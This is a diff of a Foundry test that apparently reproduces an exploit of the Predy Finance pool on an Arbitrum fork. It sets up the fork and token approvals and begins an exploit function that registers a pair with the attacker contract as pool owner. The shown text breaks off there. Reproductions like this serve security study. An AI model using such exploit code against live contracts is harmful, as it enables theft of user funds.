@@ -13,10 +13,6 @@ import "../interface.sol";
 // @Info
 // Vulnerable Contract Code : https://arbiscan.io/address/https://arbiscan.io/address/0x7b8b944ab2f24c829504a7a6d70fce5298f2147c#code
 
-// @Analysis
-// Post-mortem :
-// Twitter Guy :
-// Hacking God :
 pragma solidity ^0.8.0;
 
 contract PredyFinance is BaseTestWithBalanceLog {
@@ -27,18 +23,16 @@ contract PredyFinance is BaseTestWithBalanceLog {
 
     function setUp() public {
         vm.createSelectFork("arbitrum", blocknumToForkFrom);
-        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
         fundingToken = address(USDC);
         vm.label(address(WETH), "WETH");
         vm.label(address(USDC), "USDC");
         vm.label(address(predyPool), "PredyPool");
+
+        USDC.approve(address(predyPool), type(uint256).max);
+        WETH.approve(address(predyPool), type(uint256).max);
     }
 
     function testExploit() public balanceLog {
-        USDC.approve(address(predyPool), type(uint256).max);
-        WETH.approve(address(predyPool), type(uint256).max);
-
-        //implement exploit code here
         AddPairLogic.AddPairParams memory addPairParam = AddPairLogic.AddPairParams({
             marginId: address(WETH),
             poolOwner: address(this),
